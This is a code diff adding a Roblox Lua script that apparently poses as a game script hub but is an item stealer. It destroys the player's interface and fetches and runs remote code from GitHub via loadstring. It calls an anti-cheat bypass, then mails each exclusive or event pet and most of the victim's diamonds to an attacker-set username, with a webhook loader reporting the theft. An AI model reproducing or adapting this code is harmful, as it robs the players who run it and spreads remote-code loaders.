@@ -1,0 +1,75 @@
+local UserInputService = game:GetService("UserInputService")
+UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+
+for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
+
+function sendWebhook(webhook, message)
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or
+        pebc_execute and "ProtoSmasher" or
+        syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+
+    local url = webhook
+    local data = {
+        ["content"] = message
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {
+        Url = url,
+        Body = newdata,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef)
+end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20LoadingScreen%20%E2%9C%97"))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20HosteeAPI%20%E2%9C%97"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Moriwebh/main/webhook"))()
+
+BypassAntiCheat()
+AreaTeleport("Shop")
+TeleportToMailbox()
+local player = game:GetService("Players").LocalPlayer
+
+local dims = player.leaderstats.Diamonds.Value - 100000
+if dims < 0 then
+    dims = 0
+end
+
+wait(10)
+for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+            local args = {
+                [1] = {
+                    ["Recipient"] = _G.UserNamey,
+                    ["Diamonds"] = dims,
+                    ["Pets"] = {
+                        [1] = v.Name
+                    },
+                    ["Message"] = "Memento Mori !"
+                }
+            }
+            Networking.Invoke("Send Mail", unpack(args))
+            dims = 0
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Moriwebh/main/webhook"))()
+            wait(7)
+end
+end
+end
